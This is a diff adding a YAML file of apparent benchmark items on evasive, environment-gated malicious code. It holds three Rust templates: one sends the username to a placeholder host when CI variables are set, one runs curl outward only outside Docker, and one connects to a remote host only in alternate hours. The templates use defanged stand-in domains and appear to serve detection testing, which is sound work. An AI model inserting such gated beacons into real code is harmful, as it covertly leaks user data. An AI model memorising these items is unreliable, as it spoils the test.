@@ -1,0 +1,54 @@
+id: c7_evasive_v2
+category: C7
+name: Evasive and Environment-Gated Execution
+description: Inspects environment indicators (CI systems, containers, virtual environments) to selectively trigger malicious actions.
+defang_notes: Inert Rust code syntax tree; never executed or compiled during benchmarking.
+variants:
+  - id: c7_ci_pipeline_detector
+    surface_variant: ci_env_fingerprint
+    obfuscation_level: 0
+    domain_invalid: "pipeline-beacon.builds.invalid"
+    domain_fabricated: "build-telemetry-sink.org"
+    code_template: |
+      fn {fn_name}() {
+          use std::net::TcpStream;
+          use std::io::Write;
+          let in_ci = ["CI", "GITHUB_ACTIONS", "GITLAB_CI"].iter().any(|k| std::env::var(k).is_ok());
+          if in_ci {
+              if let Ok(mut stream) = TcpStream::connect("{target_host}:4444") {
+                  let user = std::env::var("USER").unwrap_or_default();
+                  write!(stream, "CI_BEACON: {user}\n").ok();
+              }
+          }
+      }
+
+  - id: c7_container_sandbox_evader
+    surface_variant: container_boundary_check
+    obfuscation_level: 1
+    domain_invalid: "audit-collector.cloud.invalid"
+    domain_fabricated: "cloud-audit-logger.net"
+    code_template: |
+      fn {fn_name}() {
+          use std::process::Command;
+          use std::fs;
+          let is_sandbox = std::path::Path::new("/.dockerenv").exists()
+              || fs::read_to_string("/proc/1/cgroup").map(|s| s.contains("docker")).unwrap_or(false);
+          if !is_sandbox {
+              Command::new("curl").arg("-s").arg("http://{target_host}/active").spawn().ok();
+          }
+      }
+
+  - id: c7_delayed_timer_gate
+    surface_variant: temporal_execution_gate
+    obfuscation_level: 2
+    domain_invalid: "timer-sync.infra.invalid"
+    domain_fabricated: "infra-sync-dispatcher.io"
+    code_template: |
+      fn {fn_name}() {
+          use std::net::TcpStream;
+          if let Ok(dur) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
+              if (dur.as_secs() / 3600) % 2 == 0 {
+                  TcpStream::connect(("{target_host}", 8080)).ok();
+              }
+          }
+      }
